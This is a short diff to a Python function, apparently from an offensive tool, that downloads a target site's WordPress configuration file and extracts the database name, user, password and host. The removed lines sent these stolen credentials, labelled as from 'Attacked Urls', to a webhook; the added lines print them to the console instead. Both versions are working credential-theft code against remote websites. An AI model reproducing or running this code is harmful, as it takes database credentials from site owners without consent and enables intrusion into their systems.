@@ -120,16 +120,15 @@ def configdownload(target, webhook=webhook):
             db_host = text.split("define")[5].split("('DB_HOST', '")[1].replace("');", "").replace("/** Database Charset to use in creating database tables. */", "").rstrip()
 
             info = ''
-            info += '```diff\n'
-            info += f'- Attacked Urls : {target}\n'
-            info += f'- Database Name : {db_name}\n'
-            info += f'- Database User : {db_user}\n'
-            info += f'- Database Pass : {db_pass}\n'
-            info += f'- Database Host : {db_host}\n'
-            info += '\n```'
-
-            req = requests.post(url=webhook, data={"content": str(info)}).text
-            print(req)
+            info += f''
+            info += f'      Database Name : {db_name}\n'
+            info += f'      Database User : {db_user}\n'
+            info += f'      Database Pass : {db_pass}\n'
+            info += f'      Database Host : {db_host}\n'
+            info += f''
+            print()
+            print('Database Details -')
+            print(info)
 
         except:
             print_error('Failed to pharse request data')
